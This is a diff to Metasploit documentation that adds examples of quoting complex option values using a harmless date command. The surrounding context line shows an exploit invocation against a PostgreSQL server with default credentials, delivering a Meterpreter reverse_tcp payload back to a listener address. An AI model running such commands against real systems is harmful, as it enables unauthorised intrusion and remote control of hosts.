@@ -102,6 +102,18 @@ use exploit/linux/postgres/postgres_payload
 run postgres://postgres:password@192.168.123.6 lhost=192.168.123.1 lport=5000 payload=linux/x64/meterpreter/reverse_tcp target='Linux\ x86_64' verbose=true
 ```
 
+You can set complex options using quotes. Example:
+
+```
+set COMMAND "date --date='TZ=\"America/Los_Angeles\" 09:00 next Fri' --iso-8601=ns"
+```
+
+Or the same command using single quotes and setting the option inline:
+
+```
+run COMMAND='date --date='\''TZ="America/Los_Angeles" 09:00 next Fri'\'' --iso-8601=ns'
+```
+
 ### URI support for RHOSTS
 
 Metasploit also supports the use of [URI](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier) strings as arguments,
